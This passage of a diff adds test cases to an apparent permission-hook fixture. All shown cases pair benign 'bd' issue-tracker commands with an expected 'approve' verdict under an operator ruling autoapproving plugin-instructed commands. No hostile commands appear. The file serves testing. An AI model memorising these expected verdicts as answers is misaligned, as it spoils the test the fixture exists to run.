@@ -2083,5 +2083,3717 @@
     "rules_config": {},
     "expected_verdict": "approve",
     "notes": "Instructed by phillipg-nix-repo-base plugins (audit:195)."
+  },
+  {
+    "case": "plugin_wayfinder_beads_bd_show_pg2_abc12_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "wayfinder-beads"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd show pg2-abc12" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the wayfinder-beads plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_wayfinder_beads_bd_list_json_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "wayfinder-beads"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd list --json" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the wayfinder-beads plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_wayfinder_beads_bd_search_terms_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "wayfinder-beads"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd search \"terms\"" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the wayfinder-beads plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_wayfinder_beads_bd_ready_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "wayfinder-beads"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd ready" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the wayfinder-beads plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_wayfinder_beads_bd_ready_parent_pg2_map1_unassigned_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "wayfinder-beads"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd ready --parent pg2-map1 --unassigned" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the wayfinder-beads plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_wayfinder_beads_bd_ready_claim_actor_sess_1_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "wayfinder-beads"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd ready --claim --actor sess-1" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the wayfinder-beads plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_wayfinder_beads_bd_update_pg2_abc12_claim_actor_sess_1_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "wayfinder-beads"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd update pg2-abc12 --claim --actor sess-1" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the wayfinder-beads plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_wayfinder_beads_bd_update_pg2_abc12_status_open_assignee_actor_sess_1_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "wayfinder-beads"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd update pg2-abc12 --status open --assignee \"\" --actor sess-1"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the wayfinder-beads plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_wayfinder_beads_bd_update_pg2_abc12_status_blocked_assignee_actor_sess_1_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "wayfinder-beads"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd update pg2-abc12 --status blocked --assignee \"\" --actor sess-1"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the wayfinder-beads plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_wayfinder_beads_bd_update_pg2_abc12_add_label_a_b_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "wayfinder-beads"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd update pg2-abc12 --add-label a,b" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the wayfinder-beads plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_wayfinder_beads_bd_update_pg2_map1_body_file_tmp_body_md_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "wayfinder-beads"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd update pg2-map1 --body-file /tmp/body.md" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the wayfinder-beads plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_wayfinder_beads_bd_comment_pg2_abc12_the_answer_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "wayfinder-beads"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd comment pg2-abc12 \"the answer\"" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the wayfinder-beads plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_wayfinder_beads_bd_close_pg2_abc12_reason_one_line_gist_actor_sess_1_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "wayfinder-beads"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd close pg2-abc12 --reason \"one-line gist\" --actor sess-1"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the wayfinder-beads plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_wayfinder_beads_bd_create_title_t_task_p_2_d_body_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "wayfinder-beads"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd create \"title\" -t task -p 2 -d \"body\""
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the wayfinder-beads plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_wayfinder_beads_bd_create_title_parent_pg2_map1_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "wayfinder-beads"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd create \"title\" --parent pg2-map1" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the wayfinder-beads plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_wayfinder_beads_bd_create_dest_t_epic_l_wayfinder_map_body_file_tmp_body_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "wayfinder-beads"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd create \"dest\" -t epic -l wayfinder:map --body-file /tmp/body.md --actor sess-1"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the wayfinder-beads plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_wayfinder_beads_bd_create_question_parent_pg2_map1_no_inherit_labels_l_w_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "wayfinder-beads"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd create \"question\" --parent pg2-map1 --no-inherit-labels -l wayfinder:question -d \"## Question\" --actor sess-1"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the wayfinder-beads plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_wayfinder_beads_bd_dep_add_pg2_a_blocked_by_pg2_b_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "wayfinder-beads"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd dep add pg2-a --blocked-by pg2-b" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the wayfinder-beads plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_wayfinder_beads_bd_dep_list_pg2_a_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "wayfinder-beads"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd dep list pg2-a" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the wayfinder-beads plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_bead_grooming_bd_list_status_open_exclude_label_human_has_acceptance_c_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "bead-grooming"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd list --status open --exclude-label human,has-acceptance-criteria --limit 0"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the bead-grooming plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_bead_grooming_bd_search_key_terms_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "bead-grooming"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd search \"key terms\"" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the bead-grooming plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_bead_grooming_bd_update_pg2_abc12_acceptance_statement_one_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "bead-grooming"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd update pg2-abc12 --acceptance \"- [ ] statement one\""
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the bead-grooming plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_bead_grooming_bd_update_pg2_abc12_add_label_has_acceptance_criteria_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "bead-grooming"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd update pg2-abc12 --add-label has-acceptance-criteria"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the bead-grooming plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_bead_grooming_bd_update_pg2_abc12_append_notes_open_questions_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "bead-grooming"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd update pg2-abc12 --append-notes \"Open questions\""
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the bead-grooming plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_bead_grooming_bd_update_pg2_abc12_add_label_human_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "bead-grooming"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd update pg2-abc12 --add-label human" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the bead-grooming plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_bead_grooming_bd_update_pg2_abc12_title_t_type_task_p_2_description_d_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "bead-grooming"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd update pg2-abc12 --title \"t\" --type task -p 2 --description \"d\""
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the bead-grooming plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_bead_grooming_bd_lint_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "bead-grooming"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd lint" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the bead-grooming plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_bead_grooming_bd_human_list_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "bead-grooming"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd human list" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the bead-grooming plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_bead_grooming_bd_q_quick_capture_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "bead-grooming"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd q \"quick capture\"" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the bead-grooming plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_bd_list_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd list" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_bd_show_pg2_abc12_json_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd show pg2-abc12 --json" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_bd_update_pg2_abc12_status_open_assignee_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd update pg2-abc12 --status open --assignee \"\""
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_bd_update_pg2_abc12_add_label_human_worktree_review_prio_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd update pg2-abc12 --add-label human,worktree-review --priority 0 --append-notes \"[worktree-review 2026-10-04] note. Promoted P2->P0.\" --actor sess-1"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_bd_update_pg2_abc12_remove_label_human_worktree_review_p_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd update pg2-abc12 --remove-label human,worktree-review --priority 2 --status open --assignee \"\" --append-notes \"[worktree-review-resolved 2026-10-04] verdict. Restored P0->P2.\" --actor sess-1"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_bd_update_pg2_abc12_remove_label_worktree_review_priorit_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd update pg2-abc12 --remove-label worktree-review --priority 2 --append-notes \"resolved\" --actor sess-1"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_bd_close_pg2_abc12_reason_verdict_actor_sess_1_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd close pg2-abc12 --reason \"verdict\" --actor sess-1"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_bd_dep_cycles_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd dep cycles" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_bd_dep_add_help_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd dep add --help" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_bd_update_pg2_abc12_remove_label_human_status_open_assig_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd update pg2-abc12 --remove-label human --status open --assignee \"\" --actor sess-1"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_bd_ready_label_human_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd ready --label human" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_bd_ready_exclude_label_human_label_bb_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd ready --exclude-label human --label bb" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_bd_list_parent_pg2_abc12_status_all_n_0_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd list --parent pg2-abc12 --status all -n 0"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_bd_children_pg2_abc12_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd children pg2-abc12" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_bd_comments_pg2_abc12_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd comments pg2-abc12" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_bd_list_desc_contains_artifact_status_all_n_0_json_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd list --desc-contains 'artifact' --status all -n 0 --json"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
